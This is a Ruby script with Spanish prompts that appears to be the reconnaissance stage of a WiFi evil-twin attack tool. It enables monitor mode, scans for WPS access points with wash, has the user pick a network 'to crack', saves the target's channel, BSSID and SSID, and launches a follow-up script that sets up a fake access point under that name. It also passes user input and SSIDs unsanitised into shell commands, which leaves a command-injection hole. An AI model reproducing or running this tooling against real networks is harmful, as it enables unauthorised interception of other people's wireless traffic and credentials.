#!/usr/bin/env ruby


require 'open3'
require 'highline/import'


def error
puts "\e[1;31m[*] ERROR detectado: salida dentro 5s.\e[0m"
sleep 5
abort("BYE..")
end

WAIT_FOR_WASH = 20 #secondes

puts "\e[1;33m[*] Interfaz wifi:\e[0m"
system"airmon-ng"
puts "Interfaz para el scan de redes en 2.4GHz: "
$wlan_name = gets.chomp
puts "#{$wlan_name} para el scan"
if $wlan_name.chomp.start_with?('wlan', 'wlx', 'wlp')
  `echo #{$wlan_name} > scancarte.txt`
   puts "\e[1;32m[*] Vérificacion de la interfaz wifi... OK.\e[0m"
else
error()
end


def get_wlan_interface
      wlan_interface = $wlan_name
  if wlan_interface[wlan_interface.length-3..-1] == 'mon'
    monitor_enabled = true
  else
    monitor_enabled = false
  end
  if wlan_interface.length > 0
    if monitor_enabled
      puts "Interfaz en modo monitor: #{wlan_interface}"
    else
      puts "Interfaz eligido: #{wlan_interface}"
    end
  else
    puts "No hay interfaz, exit..."
    exit!
  end
  {
      name: wlan_interface,
      monitor: monitor_enabled
  }
end

def run_airmon_zc(wlan_name)
  `ip link set #{wlan_name} down`.delete! ":"
  puts "Iniciando el modo monitor en: #{wlan_name}".delete! ":"
  system("iw dev #{wlan_name} set type monitor")
  `ip link set #{wlan_name} up`.delete! ":"
end

def run_wash(wlan_name)
  puts"#{wlan_name}".delete! ":"
#  system("wash -i #{wlan_name} &")
  cmd = "wash -i #{wlan_name}"
  puts "Iniciando wash: #{cmd} , espera #{WAIT_FOR_WASH} para que aparecen las redes..."
# sleep 30
  p = IO.popen(cmd)
  process_line = false
  wifi_points = []

  Thread.new do
    p.each_line do |line|
      if process_line
        wifi_hash = process_wash_line(line)
        if wifi_hash[:locked] == "No" or wifi_hash[:locked] == "Yes"
          wifi_points << wifi_hash
        end
      end
      if line.include?('-------')
        process_line = true
      end
    end
  end

  Thread.new do
    start_time = Time.now
    while true do
      sleep(5)
      diff = Time.now - start_time
      print "%.0f" % diff + '... '
      if diff > WAIT_FOR_WASH
        puts "\nParamos wash"
        `killall wash`
        break
      end
    end
  end.join

  wifi_points
end

def process_wash_line(line)
  fields = line.split(" ")
  wifi_point = {
      bssid: fields[0],
      channel: fields[1],
      power: fields[2],
      version: fields[3],
      locked: fields[4],
      vendor: fields[5],
      essid: fields[6]
  }
  wifi_point
end

def select_point_to_crack(access_points, wlan_iface_name)
  access_points = access_points.sort_by { |access_point| access_point[:power] }
  puts "Elige un numero (entre 0 y #{access_points.length - 1}):"
  access_points.each_with_index do |access_point, idx|
    puts "#{idx}. #{access_point[:essid]} #{access_point[:vendor]} #{access_point[:bssid]} #{access_point[:power]}dB Canal: #{access_point[:channel]}"
  end
  print "Elige un numero (Los numeros que empezan por 0, 1, 2 etc... son los numeros de redes cercas):"
  n = input_number(access_points.length)
  point_to_crack = access_points[n]
 `echo #{point_to_crack[:channel]} > canal.txt`
 `echo #{point_to_crack[:bssid]} > bssid.txt`
 `echo #{point_to_crack[:essid]} > ssid.txt`
  cmd = "ruby init.rb"
  puts "El fake AP tendra como nombre #{point_to_crack[:essid]}"
  exec(cmd)
end

def input_number(max)
  while true
    input = gets
    if input.match(/^\d+$/)
      n = input.to_i
      if n < max
        break
      end
    end
    print "Elige un numero entre 0 y #{max - 1}:"
  end
  n
end

# check_packages
wlan_iface = get_wlan_interface
wlan_iface_name = wlan_iface[:name]
if !wlan_iface[:monitor]
  run_airmon_zc(wlan_iface[:name])
  wlan_iface_name += ''
end
wifi_access_points = run_wash(wlan_iface_name)
select_point_to_crack(wifi_access_points, wlan_iface_name)

